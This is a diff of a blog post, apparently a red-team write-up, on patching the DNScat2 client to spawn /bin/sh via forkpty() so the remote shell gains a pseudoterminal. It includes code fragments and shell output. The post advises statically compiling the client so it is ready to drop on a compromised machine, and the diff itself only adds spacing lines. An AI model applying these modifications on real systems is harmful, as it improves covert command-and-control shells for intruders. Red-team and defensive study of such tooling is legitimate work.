@@ -39,7 +39,7 @@ if (pid == 0) { // Child process...
 //Daddy's code...
 ...
 ```
-
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 We can use fork() to fork our process and call the /bin/sh binary, or we can call the cool __forkpty()__. Forkpty() is where all the magic lies:
 
 ```
@@ -53,7 +53,7 @@ DESCRIPTION
   The  forkpty()  function  combines openpty(), fork(2), and login_tty() to create a new process operating in a pseudoterminal.  The file descriptor of the master side of the pseudoterminal is returned in amaster, and the filename of the slave in name if it is not NULL.  The termp and winp arguments, if
   not NULL, will determine the terminal attributes and window size of the slave side of the pseudoterminal.
 ```
-
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 So if we use forkpty(), when we do our execlp("/bin/sh"...) the shell process will be run inside a pseudoterminal. No more pty.spawn, expect, script, stty...
 
 ## Improving DNScat2
@@ -68,7 +68,7 @@ First we are going to add the includes needed:
 #include <termios.h>
 ...
 ```
-
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 Search the line `driver->pid = fork();` and edit it to use forkpty() (the original code is commented):
 
 ```
@@ -104,6 +104,7 @@ LOG_FATAL("exec: execlp failed (%d)", errno);
 exit(1);
    }  
 ```
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 We need to add our "terminalfd" to the "driver" structure:
 
 ```c
@@ -128,10 +129,12 @@ We need to add our "terminalfd" to the "driver" structure:
    select_set_closed(driver->group,       driver->pipe_stdout[PIPE_READ], exec_closed_callback);     
 ```
 
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 Lastly we need to add the flags -static (if we want a static compilation just ready to work when it is dropped in a compromised machine) and -lutil to link the libraries needed.
 
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  `make`. Et voilà!
- 
+
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 When we try to ssh other server using the original version (just download from github and compile), we see the next error message:
 ```
@@ -155,6 +158,7 @@ sh (localhost.localdomain) 2> Pseudo-terminal will not be allocated because stdi
 sh (localhost.localdomain) 2> 
 ```
 
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 With our modified version, everything works like a charm:
 
 ```
@@ -181,9 +185,11 @@ Last login: Wed May  9 09:21:41 2018
 [harlock@localhost]->~ ⌚ 13:58:48
 ```
 
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 Nice :)!
 
 ## Final words
 
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 We used DNSCat2 as example because it is a really cool project. You can extrapolate the modus operandi and use it in other projects.
 As I always say, if you find any typo or wanna comment something, feel free to reach me at twitter [@TheXC3LL](https://twitter.com/TheXC3LL)
